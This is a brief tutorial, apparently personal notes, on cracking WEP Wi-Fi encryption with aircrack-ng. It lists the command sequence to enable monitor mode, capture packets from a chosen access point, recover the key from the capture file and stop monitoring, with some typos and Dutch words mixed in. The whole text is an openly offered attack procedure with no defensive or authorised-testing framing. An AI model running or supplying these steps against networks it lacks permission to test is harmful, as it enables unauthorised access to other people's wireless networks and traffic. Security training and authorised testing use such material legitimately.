# Cracking WEP with aircrack-ng

`airmon-ng start wlan0`

`airodump-ng wlan0mon`

Don't forget to replace CHANNEL en BSSID withe the right channel and bssid.

`airodump-ng -c "CHANNEL" --bssid "BSSID" -w dump wlan0mon`

After enough packets are recieved we can crack the encryption key using:

`aircrack-ng -b "juist bssid" dump-01.cap`

After cracking the password we can stop the wlan0mon interface using:

`airmon-ng stop wlan0mon`

